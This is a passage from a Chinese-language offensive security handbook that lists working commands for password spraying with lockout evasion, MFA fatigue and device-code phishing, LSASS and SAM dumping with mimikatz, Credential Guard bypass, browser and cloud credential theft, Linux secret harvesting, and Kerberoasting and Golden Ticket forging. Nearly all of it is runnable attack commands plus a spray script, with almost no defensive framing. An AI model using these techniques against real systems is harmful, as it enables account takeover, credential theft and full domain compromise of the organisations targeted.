  --continue-on-success | grep '[+]' | awk '{print $2,$6}' > found.txt

# ===== NetExec (CrackMapExec继任者) =====
# 2026年NetExec是CrackMapExec的现代化继任者
# 支持更多协议和更好的性能
netexec smb 192.168.1.0/24 -u users.txt -p 'Welcome2026!'
netexec winrm 192.168.1.0/24 -u users.txt -p 'Password1'
netexec mssql 192.168.1.0/24 -u users.txt -p 'sa123'
netexec rdp 192.168.1.0/24 -u users.txt -p 'Admin123!'

# 智能密码喷射（基于密码策略自动调整间隔）
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt \
  --spray-delay 30 --jitter 10
```

#### 4.1.2 Kerbrute — Kerberos预认证喷射

```bash
# 用户枚举（Kerberos预认证）
./kerbrute_linux_amd64 userenum -d corp.local users.txt \
  --dc dc01.corp.local

# 密码喷射（Kerberos预认证，Windows事件ID 4771不记录失败）
./kerbrute_linux_amd64 passwordspray -d corp.local \
  users.txt 'Spring2026!'

# 暴力破解（谨慎使用）
./kerbrute_linux_amd64 bruteuser -d corp.local \
  passwords.txt administrator

# 使用Hash破解模式
./kerbrute_linux_amd64 bruteforce -d corp.local \
  --dc dc01.corp.local users.txt passwords.txt
```

#### 4.1.3 DomainPasswordSpray

```powershell
# PowerShell域密码喷射
Import-Module .\DomainPasswordSpray.ps1

# 获取用户列表
Get-DomainUserList -Domain corp.local -RemoveDisabled -RemovePotentialLockouts

# 执行密码喷射（自动检测锁定策略）
Invoke-DomainPasswordSpray -Password 'Spring2026!' -OutFile results.txt

# 多密码喷射（自动间隔）
Invoke-DomainPasswordSpray -PasswordList passwords.txt -Delay 30 -Jitter 5

# 强制使用LDAP（避免SMB日志）
Invoke-DomainPasswordSpray -Password 'Password1' -ForceLDAP
```

### 4.2 Office 365 / Azure AD 密码喷射

#### 4.2.1 MSOLSpray / MailSniper

```powershell
# ===== MSOLSpray =====
Import-Module .\MSOLSpray.ps1

# 对O365/Azure AD进行密码喷射
Invoke-MSOLSpray -UserList users.txt -Password 'Spring2026!'

# 使用时间窗口规避检测
Invoke-MSOLSpray -UserList users.txt -Password 'Password1' \
  -Window 3600 -MaxAttempts 3

# ===== MailSniper =====
Import-Module .\MailSniper.ps1

# O365密码喷射
Invoke-PasswordSprayOWA -ExchHostname outlook.office365.com \
  -UserList users.txt -Password 'Summer2026!'

# Exchange On-Prem密码喷射
Invoke-PasswordSprayOWA -ExchHostname mail.corp.com \
  -UserList .\users.txt -Password 'Password123'

# O365用户枚举
Invoke-UsernameHarvestOWA -ExchHostname outlook.office365.com \
  -UserList .\potential_users.txt -OutFile valid_users.txt
```

#### 4.2.2 Azure AD Graph API 密码喷射

```bash
# 使用Python脚本进行Azure AD密码喷射
python3 azuread_spray.py \
  --tenant corp.onmicrosoft.com \
  --users users.txt \
  --password 'Spring2026!' \
  --delay 30

# 使用Token保护的Azure AD
python3 azuread_spray.py \
  --tenant corp.onmicrosoft.com \
  --users users.txt \
  --password 'Password1' \
  --use-ropc \
  --delay 60
```

### 4.3 MFA绕过技术（2026）

```bash
# ===== MFA疲劳攻击 =====
# 持续发送MFA推送通知，直到用户接受
# 使用MFASweep
python3 mfasweep.py --target corp.onmicrosoft.com \
  --users users.txt --password 'KnownPassword123' \
  --mfa-fatigue --push-interval 60

# ===== MFA降级攻击 =====
# 尝试旧版协议绕过MFA
# IMAP/POP3/SMTP 基本认证（如果未禁用）
python3 legacy_auth_spray.py \
  --target outlook.office365.com \
  --users users.txt --password 'Spring2026!' \
  --protocol imap

# ===== OAuth 设备码钓鱼 =====
# 诱骗用户输入设备码，获取OAuth Token
python3 device_code_phish.py \
  --tenant corp.onmicrosoft.com \
  --client-id 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
  --resource https://graph.microsoft.com

# ===== SIM卡劫持 + MFA绕过 =====
# 通过SIM Swap绕过短信MFA
# 2026年推荐使用FIDO2/Passkey替代短信MFA

# ===== TOTP种子窃取 =====
# 从已控主机提取TOTP种子
python3 totp_seed_extract.py --target 192.168.1.100 \
  --apps "Google Authenticator,Microsoft Authenticator,Authy"

# ===== 2026 MFA绕过最新技术 =====
# WebAuthn/Passkey 降级到密码认证
# 检测网站是否同时支持Passkey和密码认证
python3 webauthn_downgrade.py \
  --target https://login.corp.com \
  --username admin@corp.com
```

### 4.4 智能锁定策略分析

```bash
# ===== 锁定策略分析工具 =====
# 1. 识别锁定阈值
# Windows域: net accounts /domain 或 Get-ADDefaultDomainPasswordPolicy
# Azure AD: Get-AzureADPolicy | Where Type -eq "Password Protection Policy"

# 2. 计算安全攻击窗口
# 公式: 安全尝试次数 = 锁定阈值 - 1
# 时间窗口: 锁定观察窗口 (通常30分钟)
# 安全攻击频率: 每30分钟 N-1 次尝试

# 3. 最少尝试策略（Least-Attempts Strategy）
# 目标: 在锁定阈值以下最大化成功率
# 策略: 使用Top 3密码，每30分钟对不同账户尝试1次
# 密码排序: 基于组织常见密码模式
# 2026年Top 3组织密码:
#   - Season+Year+! (如: Summer2026!)
#   - CompanyName+Number+! (如: AcmeCorp1!)
#   - Location+Season+Number (如: DubaiSpring1)

# 4. 自动化安全喷射脚本
cat > safe_spray.py << 'PYEOF'
import subprocess
import time
import random

def safe_spray(users, passwords, lockout_threshold, window_minutes):
    """安全密码喷射：在锁定阈值以下执行"""
    attempts_per_window = lockout_threshold - 1
    window_seconds = window_minutes * 60
    
    for password in passwords:
        for i in range(0, len(users), attempts_per_window):
            batch = users[i:i+attempts_per_window]
            for user in batch:
                print(f"[*] Trying {user}:{password}")
                # 执行实际认证尝试
                time.sleep(random.uniform(2, 5))  # 随机延迟
            print(f"[*] Waiting {window_seconds}s for lockout window reset")
            time.sleep(window_seconds)

# 使用示例
users = open('users.txt').read().splitlines()
passwords = ['Summer2026!', 'Password123', 'AcmeCorp1!', 'Welcome123']
safe_spray(users, passwords, lockout_threshold=5, window_minutes=30)
PYEOF
```

---

## 5. Windows凭据提取

Windows凭据分布在多个位置——SAM注册表、LSASS进程内存、DPAPI加密存储、浏览器SQLite数据库、计划任务配置、服务账户等。凭据提取是横向移动和权限提升的关键环节。

### 5.1 SAM/SYSTEM/SECURITY 注册表提取

SAM（Security Account Manager）存储本地用户的NTLM/LM哈希，SYSTEM包含解密SAM所需的密钥，SECURITY包含LSA Secrets（服务账户密码、计划任务密码等）。

```bash
# ===== 方法1：reg save（需要管理员权限）=====
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# 使用impacket-secretsdump提取哈希
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# ===== 方法2：卷影副本 (VSS) =====
# 创建卷影副本
vssadmin create shadow /for=C:
# 或使用 wmic
wmic shadowcopy call create Volume='C:\'

# 从卷影副本复制SAM/SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# ===== 方法3：invoke-ninjaCopy（绕过文件锁定）=====
Import-Module .\invoke-ninjaCopy.ps1
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SAM" -LocalDestination "sam.hive"
Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -LocalDestination "system.hive"

# ===== 方法4：PowerShell直接提取 =====
# 使用PowerSploit的Get-PassHashes
Import-Module .\PowerSploit.psd1
Get-PassHashes

# ===== 提取LSA Secrets（服务账户密码）=====
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
# 输出示例:
# [*] Target system bootKey: 0x...
# [*] Dumping LSA Secrets
# [*] $MACHINE.ACC
# $MACHINE.ACC:plain_password_hex:...
# DPAPI_SYSTEM
# dpapi_machinekey:... dpapi_userkey:...
# DefaultPassword
# (密码明文)
```

### 5.2 LSASS凭据Dump

LSASS（Local Security Authority Subsystem Service）进程在内存中缓存用户凭据，包括NTLM哈希、Kerberos票据、明文密码（如果启用了WDigest）。

#### 5.2.1 procdump + mimikatz（经典组合）

```bash
# ===== 步骤1：使用procdump转储LSASS内存 =====
# 方法A：sysinternals procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 方法B：任务管理器（仅限交互式桌面）
# 右键lsass.exe → 创建转储文件

# 方法C：使用comsvcs.dll（绕过部分AV）
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump \
  (Get-Process lsass).Id C:\temp\lsass.dmp full

# 方法D：使用PowerShell
Get-Process lsass | ForEach-Object {
  $proc = $_
  rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $proc.Id C:\temp\lsass.dmp full
}

# ===== 步骤2：使用mimikatz离线分析转储文件 =====
# 在离线分析机器上：
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit

# 提取特定凭据类型
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::ekeys" exit    # Kerberos密钥
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::tickets /export" exit  # Kerberos票据
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::pth" exit     # PtH

# ===== 步骤3：在线mimikatz（高风险，需要SYSTEM或管理员）=====
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
mimikatz.exe "privilege::debug" "lsadump::sam" exit
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:krbtgt" exit
```

#### 5.2.2 2026 Credential Guard对抗

```bash
# ===== Credential Guard绕过技术 =====
# Windows 11 24H2和Windows Server 2025默认启用Credential Guard
# 方法1：修改注册表 + 重启（需要物理访问或管理员）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 0 /f
# 重启后mimikatz可正常工作

# 方法2：VBS降级（Hyper-V虚拟化安全降级）
bcdedit /set hypervisorlaunchtype off
# 需要重启，重启后Credential Guard失效

# 方法3：使用mimikatz的mimidrv.sys驱动
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" exit

# 方法4：使用PPLdump绕过LSA保护
PPLdump.exe lsass.exe lsass_ppl.dmp

# 方法5：使用HandleKatz（2026新兴工具）
# 从LSASS进程句柄中提取凭据，不创建转储文件
HandleKatz.exe --pid:lsass --output:creds.txt

# 方法6：使用NanoDump（Minidump+签名绕过）
NanoDump.exe --process lsass.exe --output lsass_dump.bin
```

#### 5.2.3 sekurlsa 模块详解

```bash
# sekurlsa模块完整命令参考
mimikatz.exe "privilege::debug"

# 获取所有登录凭据（含明文密码）
"sekurlsa::logonpasswords"

# 获取Kerberos加密密钥
"sekurlsa::ekeys"

# 导出Kerberos票据
"sekurlsa::tickets /export"

# 获取MSV（NTLM哈希）
"sekurlsa::msv"

# 获取WDigest（明文密码，需要注册表启用）
"sekurlsa::wdigest"

# 获取Kerberos
"sekurlsa::kerberos"

# 获取SSP（安全支持提供程序）
"sekurlsa::ssp"

# 获取LiveSSP
"sekurlsa::livessp"

# 获取TSPkg
"sekurlsa::tspkg"

# Pass-the-Hash
"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH"

# Pass-the-Ticket
"sekurlsa::ptt /ticket:krbtgt.kirbi"

# 覆盖当前登录会话的NTLM哈希
"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH /run:cmd.exe"
```

### 5.3 DPAPI解密与凭据提取

DPAPI（Data Protection API）是Windows的数据保护机制，用于加密存储浏览器密码、WiFi密码、RDP凭据、证书私钥等。

#### 5.3.1 DPAPI Masterkey解密

```bash
# ===== 提取DPAPI Masterkey =====
# 方法1：使用mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit

# 方法2：从文件系统提取
# Masterkey文件位置:
# 用户: C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
# 系统: C:\Windows\System32\Microsoft\Protect\S-1-5-18\User\

# 解密Masterkey（需要用户密码或SHA1哈希）
mimikatz.exe "dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /password:USER_PASSWORD" exit
mimikatz.exe "dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /sha1:USER_PASSWORD_HASH" exit

# ===== 使用SharpDPAPI =====
# .NET工具，无需mimikatz
SharpDPAPI.exe masterkeys

# 解密所有Masterkey
SharpDPAPI.exe masterkeys /password:"UserPassword123"

# 使用域备份密钥解密
SharpDPAPI.exe masterkeys /pvk:domain_backup_key.pvk
```

#### 5.3.2 浏览器凭据提取

```bash
# ===== Chrome/Edge凭据 =====
# 加密数据库位置:
# Chrome: %LocalAppData%\Google\Chrome\User Data\Default\Login Data
# Edge: %LocalAppData%\Microsoft\Edge\User Data\Default\Login Data

# 使用mimikatz解密
mimikatz.exe "dpapi::chrome /in:%LocalAppData%\Google\Chrome\User Data\Default\Login Data" exit

# 使用SharpChrome
SharpChrome.exe logins

# 使用LaZagne
laZagne.exe browsers

# 使用Python脚本（需要DPAPI Masterkey）
python3 chrome_decrypt.py --login-data "Login Data" --masterkey MASTERKEY

# 2026 浏览器凭据提取新工具
# 使用BrowsingHistoryView（支持Chrome/Firefox/Edge/Brave/Opera）
BrowsingHistoryView.exe /scomma browser_creds.csv

# ===== Firefox凭据 =====
# Firefox使用自己的加密（NSS库）
# 位置: %AppData%\Mozilla\Firefox\Profiles\<profile>\
# logins.json + key4.db + cert9.db

# 使用firefox_decrypt
python3 firefox_decrypt.py /path/to/firefox/profile

# 使用LaZagne
laZagne.exe browsers -firefox
```

#### 5.3.3 其他DPAPI保护凭据

```bash
# ===== RDP连接凭据 =====
# 位置: %LocalAppData%\Microsoft\Remote Desktop Connection\default.rdp
# 或凭据管理器: cmdkey /list

# 使用mimikatz提取
mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\CREDENTIAL_FILE" exit

# 使用SharpDPAPI
SharpDPAPI.exe credentials

# ===== WiFi密码提取 =====
# 列出所有WiFi配置文件
netsh wlan show profiles

# 导出特定WiFi密码
netsh wlan show profile name="SSID" key=clear

# 导出所有WiFi密码
for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr ":"') do @(netsh wlan show profile name="%a" key=clear | findstr "Key Content")

# 使用SharpDPAPI提取WiFi凭据
SharpDPAPI.exe wifi

# ===== 计划任务凭据 =====
# 带密码保存的计划任务
schtasks /query /fo LIST /v | findstr /i "TaskName UserName Password"

# 使用Get-ScheduledTaskCred
Import-Module .\Get-ScheduledTaskCred.ps1
Get-ScheduledTaskCred
```

### 5.4 LaZagne — 全平台凭据收集

```bash
# ===== LaZagne 全模块凭据收集 =====
# 所有模块
laZagne.exe all

# 指定模块
laZagne.exe browsers
laZagne.exe windows
laZagne.exe wifi
laZagne.exe mails
laZagne.exe databases
laZagne.exe sysadmin
laZagne.exe memory

# 输出到文件
laZagne.exe all -oN -output C:\temp\creds
laZagne.exe all -oA -output C:\temp\creds  # 所有格式

# 安静模式
laZagne.exe all -quiet

# ===== Linux LaZagne =====
python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py wifi
python3 laZagne.py memory

# ===== 2026 LaZagne增强 =====
# 支持更多应用：Teams/Slack/Discord/Docker/Cloud CLI
laZagne.exe chat
laZagne.exe containers
laZagne.exe cloud
```

### 5.5 域凭据攻击

#### 5.5.1 DCSync — 从DC同步凭据

```bash
# ===== DCSync攻击（需要域管理员或等效权限）=====
# 使用mimikatz
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /all" exit
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:Administrator" exit

# 使用impacket-secretsdump
impacket-secretsdump corp.local/administrator:Password123@dc01.corp.local
impacket-secretsdump -just-dc corp.local/administrator:Password123@dc01.corp.local
impacket-secretsdump -just-dc-ntlm corp.local/administrator@dc01.corp.local -hashes :NTLM_HASH

# 输出包含:
# - 所有域用户的NTLM哈希
# - Kerberos密钥（AES256/AES128/DES）
# - 域计算机账户哈希
# - krbtgt账户哈希（用于Golden Ticket）
```

#### 5.5.2 NTDS.dit 提取

```bash
# ===== NTDS.dit提取方法 =====
# 方法1：使用ntdsutil（DC本地）
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit

# 方法2：使用vssadmin（DC本地）
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
vssadmin delete shadows /shadow={SHADOW_ID}

# 方法3：使用impacket-secretsdump远程提取
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# 方法4：使用diskshadow（无文件VSS）
# diskshadow.txt:
# set context persistent nowriters
# add volume c: alias someAlias
# create
# expose %someAlias% z:
# exec "cmd.exe" /c copy z:\Windows\NTDS\NTDS.dit C:\temp\ntds.dit
diskshadow /s diskshadow.txt
```

### 5.6 域缓存凭据 DCC2

```bash
# ===== 域缓存凭据提取 =====
# 位置: HKLM\SECURITY\Cache
# 包含最近登录域用户的哈希（DCC2格式）

# 使用mimikatz提取
mimikatz.exe "privilege::debug" "lsadump::cache" exit

# 使用impacket-secretsdump
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

# 破解DCC2 Hash
# Hashcat模式 2100
hashcat -m 2100 dcc2_hashes.txt /wordlists/rockyou.txt -r best64.rule

# John破解
john --format=mscash2 dcc2_hashes.txt
```

---

## 6. Linux凭据提取

Linux系统的凭据分布在多个位置，从/etc/shadow到SSH密钥、从配置文件到环境变量，攻击者需要系统性地收集。

### 6.1 /etc/shadow破解

```bash
# ===== 提取shadow文件 =====
# 需要root权限
cat /etc/shadow

# 合并passwd和shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# ===== 破解Linux Hash =====
# Hashcat 模式
hashcat -m 1800 sha512crypt.txt /wordlists/rockyou.txt  # SHA-512 Crypt ($6$)
hashcat -m 7400 sha256crypt.txt /wordlists/rockyou.txt  # SHA-256 Crypt ($5$)
hashcat -m 3200 bcrypt.txt /wordlists/rockyou.txt       # bcrypt ($2b$)
hashcat -m 500  md5crypt.txt /wordlists/rockyou.txt     # MD5 Crypt ($1$)
hashcat -m 1500 descrypt.txt /wordlists/rockyou.txt     # DES Crypt

# John破解
john --format=sha512crypt unshadowed.txt
john --format=bcrypt unshadowed.txt

# ===== 检查可写shadow文件 =====
ls -la /etc/shadow
# 如果可写，直接添加新密码哈希
openssl passwd -6 -salt xyz "newpassword"
echo 'root:$6$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/shadow
```

### 6.2 SSH密钥窃取

```bash
# ===== SSH私钥搜索 =====
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" 2>/dev/null

# 常见位置
ls -la ~/.ssh/id_*
ls -la /root/.ssh/id_*
ls -la /home/*/.ssh/id_*

# ===== 检查私钥权限 =====
# 权限过宽（644）的私钥可被读取
find / -name "id_rsa" -perm 644 2>/dev/null

# ===== authorized_keys分析 =====
cat ~/.ssh/authorized_keys
# 识别可信任的密钥对，寻找对应的私钥
# 搜索私钥与公钥匹配
ssh-keygen -y -f id_rsa  # 从私钥生成公钥
diff <(ssh-keygen -y -f found_id_rsa) authorized_keys.pub

# ===== known_hosts分析 =====
cat ~/.ssh/known_hosts
# 识别目标系统连接过的服务器
# 这些服务器可能是下一步攻击目标

# ===== SSH密钥密码破解 =====
# 使用John破解SSH私钥密码
ssh2john id_rsa > id_rsa.john
john --wordlist=rockyou.txt id_rsa.john

# 使用Hashcat (模式22921 - SSH私钥)
hashcat -m 22921 id_rsa.hash /wordlists/rockyou.txt
```

### 6.3 命令历史文件

```bash
# ===== Bash历史 =====
cat ~/.bash_history
cat /root/.bash_history
cat /home/*/.bash_history

# 搜索所有用户的bash历史
find / -name ".bash_history" -exec cat {} \; 2>/dev/null

# 搜索凭据相关命令
cat ~/.bash_history | grep -iE 'passwd|password|secret|token|api.?key|mysql|psql|ssh|scp|aws|az|gcloud'

# ===== 其他Shell历史 =====
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.python_history
cat ~/.node_repl_history
cat ~/.redis_history

# 搜索所有历史文件
find / -name ".*_history" -exec cat {} \; 2>/dev/null

# ===== 2026 新兴历史文件 =====
cat ~/.local/share/fish/fish_history  # Fish Shell
cat ~/.config/htop/htoprc             # htop历史
cat ~/.lesshst                         # less历史搜索
```

### 6.4 配置文件凭据

```bash
# ===== 系统配置文件 =====
# 网络配置
cat /etc/network/interfaces
cat /etc/sysconfig/network-scripts/ifcfg-*
cat /etc/netplan/*.yaml

# VPN配置
cat /etc/openvpn/*.conf
cat /etc/ppp/chap-secrets

# Samba凭证
cat /etc/samba/smb.conf
cat /etc/samba/credentials

# ===== 应用配置文件 =====
# 数据库配置
grep -r "password" /etc/mysql/ 2>/dev/null
grep -r "password" /etc/postgresql/ 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null  # WordPress
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/.env 2>/dev/null

# Web服务配置
grep -r "password\|passwd\|secret\|token\|api.?key\|DB_PASS\|DATABASE_URL" \
  /var/www/ 2>/dev/null
grep -r "password" /etc/nginx/ 2>/dev/null
grep -r "password" /etc/apache2/ 2>/dev/null

# ===== Docker相关 =====
cat /var/lib/docker/config.json
cat ~/.docker/config.json
docker inspect $(docker ps -q) | grep -iE 'pass|secret|token|env'

# ===== Git配置 =====
cat ~/.gitconfig
cat ~/.git-credentials
find / -name ".git-credentials" -exec cat {} \; 2>/dev/null

# ===== 云凭据 =====
cat ~/.aws/credentials
cat ~/.aws/config
cat ~/.azure/accessTokens.json
cat ~/.config/gcloud/credentials.db
cat ~/.aliyun/config.json
cat ~/.tencentcloud/credentials
```

### 6.5 进程环境变量与内存

```bash
# ===== 进程环境变量 =====
# 查看所有进程的环境变量
for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
  echo "=== PID: $pid ==="
  cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'pass|secret|token|key|cred'
done

# 特定进程
cat /proc/1/environ | tr '\0' '\n'
cat /proc/$(pgrep -f mysql)/environ | tr '\0' '\n'

# ===== /proc文件系统 =====
# 进程命令行参数（可能含密码）
ps auxwww
ps -eo pid,command | grep -iE 'pass|secret|token|key'

# ===== 内存转储 =====
# 使用gcore转储进程内存
gcore $(pgrep -f ssh-agent)
strings core.* | grep -iE 'pass|secret|key|BEGIN.*PRIVATE'

# 使用gdb
gdb -p $(pgrep -f ssh-agent) -batch -ex "dump memory /tmp/mem.dump 0x0000000000400000 0x00007fffffffffff"

# ===== SSH Agent劫持 =====
# 检查SSH_AUTH_SOCK
echo $SSH_AUTH_SOCK
ls -la $SSH_AUTH_SOCK

# 使用SSH Agent密钥
SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.1234 ssh user@target
```

### 6.6 tcpdump网络凭据嗅探

```bash
# ===== 抓取明文协议密码 =====
# HTTP基本认证
tcpdump -i eth0 -A -s 0 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)' | \
  grep -i 'authorization\|password\|username'

# FTP密码
tcpdump -i eth0 -A -s 0 'tcp port 21' | grep -i 'USER\|PASS'

# Telnet密码
tcpdump -i eth0 -A -s 0 'tcp port 23'

# SMTP/POP3/IMAP
tcpdump -i eth0 -A -s 0 'tcp port 25 or tcp port 110 or tcp port 143' | \
  grep -i 'AUTH LOGIN\|AUTH PLAIN'

# MySQL认证
tcpdump -i eth0 -A -s 0 'tcp port 3306' | grep -i 'password'

# LDAP简单认证
tcpdump -i eth0 -A -s 0 'tcp port 389'

# ===== 保存pcap离线分析 =====
tcpdump -i eth0 -w capture.pcap -s 0
# 使用Wireshark或tshark分析
tshark -r capture.pcap -Y "http.request" -T fields -e http.authbasic
tshark -r capture.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS"
```

---

## 7. Kerberos攻击

Kerberos是Active Directory的默认认证协议，其票据机制、委派配置、PAC签名等环节存在多种攻击面。理解Kerberos攻击需要对协议流程有深入认识。

### 7.1 Kerberos协议攻击流程

```
客户端                          KDC (AS)                          KDC (TGS)                      服务
   │                               │                                  │                             │
   │── AS-REQ (用户名 + 时间戳) ──→│                                  │                             │
   │                               │── 验证用户 → 生成TGT            │                             │
   │←── AS-REP (TGT加密) ─────────│                                  │                             │
   │                               │                                  │                             │
   │── TGS-REQ (TGT + SPN) ───────┼─────────────────────────────────→│                             │
   │                               │                                  │── 验证TGT → 生成TGS         │
   │←── TGS-REP (TGS服务票据) ────┼─────────────────────────────────│                             │
   │                               │                                  │                             │
   │── AP-REQ (TGS票据) ──────────┼──────────────────────────────────────────────→│
   │                               │                                  │                             │
   │                                                                  │←── 验证票据 → 服务访问      │
   │                                                                  │                              │
   【攻击点】:
   AS-REQ: 用户枚举、AS-REP Roasting（无预认证）
   AS-REP: 离线破解TGT加密部分
   TGS-REQ: Kerberoasting（离线破解TGS票据）
   TGS-REP: Silver Ticket（伪造TGS票据）
   TGT: Golden Ticket（伪造TGT）
   S4U: 委派滥用（Unconstrained/Constrained/RBCD）
```

### 7.2 Kerberoasting — 离线破解TGS票据

Kerberoasting利用任何域用户都可以请求任意SPN的TGS票据这一特性，获取服务账户的NTLM哈希进行离线破解。

```bash
# ===== 方法1：Rubeus（Windows）=====
# 列出所有SPN
Rubeus.exe kerberoast

# 指定SPN类型
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local

# 使用AES256加密（更安全更隐蔽）
Rubeus.exe kerberoast /aes256

# 输出Hashcat格式
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt

# 使用特定用户凭据
Rubeus.exe kerberoast /creduser:corp.local\user /credpassword:Password123

# ===== 方法2：impacket-GetUserSPNs（Linux）=====
# 基础Kerberoasting
impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 192.168.1.10

# 请求特定用户SPN
impacket-GetUserSPNs corp.local/user:Password123 -request-user sql_svc

# 输出所有TGS
impacket-GetUserSPNs corp.local/user:Password123 -request -outputfile kerberoast_hashes.txt

# ===== 方法3：PowerShell（PowerView）=====
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat

# ===== 破解Kerberoasting哈希 =====
# RC4-HMAC (Hashcat模式 13100)
hashcat -m 13100 kerberoast_hashes.txt /wordlists/rockyou.txt -r best64.rule

# AES128-CTS-HMAC-SHA1-96 (Hashcat模式 19600)
hashcat -m 19600 kerberoast_aes128.txt /wordlists/rockyou.txt

# AES256-CTS-HMAC-SHA1-96 (Hashcat模式 19700)
hashcat -m 19700 kerberoast_aes256.txt /wordlists/rockyou.txt

# John破解
john --format=krb5tgs kerberoast_hashes.txt
```

### 7.3 AS-REP Roasting — 无预认证账户攻击

配置了"不需要Kerberos预认证"的账户，攻击者可以在不知道密码的情况下请求AS-REP，获取加密的TGT部分进行离线破解。

```bash
# ===== 方法1：Rubeus =====
# 自动发现并攻击无预认证账户
Rubeus.exe asreproast

# 指定用户
Rubeus.exe asreproast /user:target_user /format:hashcat /outfile:asrep_hashes.txt

# ===== 方法2：impacket-GetNPUsers =====
# 从用户列表中发现无预认证账户
impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# 已知无预认证用户
impacket-GetNPUsers corp.local/target_user -format hashcat -no-pass

# 通过DC IP指定
impacket-GetNPUsers corp.local/ -dc-ip 192.168.1.10 -usersfile users.txt -format john

# ===== 方法3：PowerView =====
# 查找无预认证账户
Get-DomainUser -PreauthNotRequired

# 请求AS-REP哈希
Get-ASREPHash -UserName target_user -Format Hashcat

# ===== 破解AS-REP哈希 =====
# Hashcat (模式18200)
hashcat -m 18200 asrep_hashes.txt /wordlists/rockyou.txt -r best64.rule

# John
john --format=krb5asrep asrep_hashes.txt
```

### 7.4 Golden Ticket — 伪造TGT

Golden Ticket是最强大的Kerberos攻击——获取krbtgt账户的NTLM哈希后，可以伪造任意用户的TGT，获得域内任意资源访问权限。

```bash
# ===== 前提：获取krbtgt哈希 =====
# 通过DCSync
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" exit

# ===== 方法1：mimikatz Golden Ticket =====
# 获取域SID
whoami /user  # 或 Get-DomainSID

# 伪造Golden Ticket
mimikatz.exe "kerberos::golden \
  /domain:corp.local \
  /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /krbtgt:NTLM_HASH_OF_KRBTGT \
  /user:Administrator \
  /id:500 \
  /groups:512,513,518,519,520 \
  /ticket:golden.kirbi" exit

# 注入票据
mimikatz.exe "kerberos::ptt golden.kirbi" exit

# 验证
dir \\dc01.corp.local\c$

# ===== 方法2：impacket-ticketer =====
# 创建Golden Ticket
impacket-ticketer \
  -domain-sid S-1-5-21-XXXX-XXXX-XXXX \
  -domain corp.local \
  -nthash NTLM_HASH_OF_KRBTGT \
  Administrator

# 使用票据
export KRB5CCNAME=Administrator.ccache
impacket-psexec corp.local/Administrator@dc01.corp.local -k -no-pass

# ===== 方法3：Rubeus Golden Ticket =====
Rubeus.exe golden \
  /domain:corp.local \
  /sid:S-1-5-21-XXXX-XXXX-XXXX \
  /rc4:NTLM_HASH_OF_KRBTGT \
  /user:Administrator \
  /id:500 \
  /ptt
```

### 7.5 Silver Ticket — 伪造TGS

